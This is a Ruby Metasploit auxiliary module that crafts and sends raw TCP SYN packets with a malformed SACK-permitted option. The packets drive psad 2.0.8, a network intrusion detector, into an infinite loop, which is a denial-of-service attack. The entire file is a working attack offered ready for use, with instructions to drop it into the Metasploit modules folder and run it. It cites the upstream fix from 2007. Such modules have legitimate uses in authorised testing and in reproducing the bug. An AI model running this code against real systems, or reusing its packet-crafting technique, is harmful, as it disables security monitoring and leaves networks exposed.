require 'msf/core'
require 'racket'

# psad_invalid_tcp_option_dos.rb
# last modified:	2010 Oct 18
# Just drop this in ~/.msf3/modules/auxiliary/dos/psad/ and run.

# Special thanks to Jon Hart for helping me out with this.

# The add_raw_option function was added to Racket in r176,
# current (15.10.2010) version of Metasploit has an older
# version, thus we need to define this here.
module Racket::L4
	class TCP
		def add_raw_option(value)
			@options << value
		end
	end
end

class Metasploit3 < Msf::Auxiliary

  	include Msf::Exploit::Capture

        def initialize
                super(
			'Name'        => 'psad 2.0.8 invalid TCP option denial of service',
			'Description' => %q{
					A bug is triggered in
					"Port Scan Attack Detector" (psad) NIDS when it receives
					an TCP packet that has a malformed "SACK-permitted"
					option set. This makes psad to go into an infinite loop,
					thus causing excessive resource consumption (both CPU and memory)
					and possibly resulting to a denial of service.

					This affects at least the 2.0.8 version of psad and probably
					also earlier versions.

					This bug has been fixed in 2007 and the current versions of psad
					report these invalid packets to syslog.
					},
                        'Author'      => 'pyllyukko',
                        'License'     => MSF_LICENSE,
                        'Version'     => '0.9',
                        'References'  =>
				[
					[ 'URL', 'http://trac.cipherdyne.org/trac/psad/changeset/2108' ],
					[ 'URL', 'http://trac.cipherdyne.org/trac/psad/changeset/2111' ],
				])

		register_options([
			OptInt.new('RPORT', [true, 'The destination port', 6881]),
			OptInt.new('COUNT', [ true, "The number of packets to send", 1]),
			OptAddress.new('SHOST', [false, 'Source address (defaults to yours)'])
		], self.class)

		# unnecessary options
		deregister_options('FILTER', 'PCAPFILE', 'SNAPLEN', 'TIMEOUT')
        end

	def run
		print_status("Crafting the magic packet")
		
		open_pcap
		
		count = datastore['COUNT'].to_i
		
		n = Racket::Racket.new
		
		# Network Layer
		n.l3		= Racket::L3::IPv4.new
		n.l3.src_ip	= datastore['SHOST'] || Rex::Socket.source_address(rhost)
		n.l3.dst_ip	= rhost
		# TCP protocol
		n.l3.protocol	= 0x6
		n.l3.id		= 26099
		# set the don't fragment bit
		n.l3.flags	= 2
		n.l3.ttl	= 128
		
		# Transport Layer
		n.l4 = Racket::L4::TCP.new
		n.l4.src_port	= 3936
		n.l4.seq	= 2757596431
		n.l4.ack	= 0
		n.l4.flag_syn	= 1
		n.l4.dst_port	= datastore['RPORT'].to_i
		n.l4.window	= 65535
		
		# the important part is the invalid SACK-permitted option (\x04\x00)
		n.l4.add_raw_option("\x02\x04\x05\xB4\x01\x01\x04\x00")
		n.l4.fix!(n.l3.src_ip, n.l3.dst_ip, "")
		
		pkt = n.pack
		
		print_status("Ready to launch")
		
		if(count > 0)
			print_status("Sending #{count} magic packet(s) to #{rhost}:#{datastore['RPORT']}")

		        count.times {
				capture_sendto(pkt, rhost)
			}
			# Metasploit seems to bail with an error message if it fails to send this,
			# so there's no sense in making our own error detection here.
			print_status("Packet(s) sent")
		end
		close_pcap
        end
end
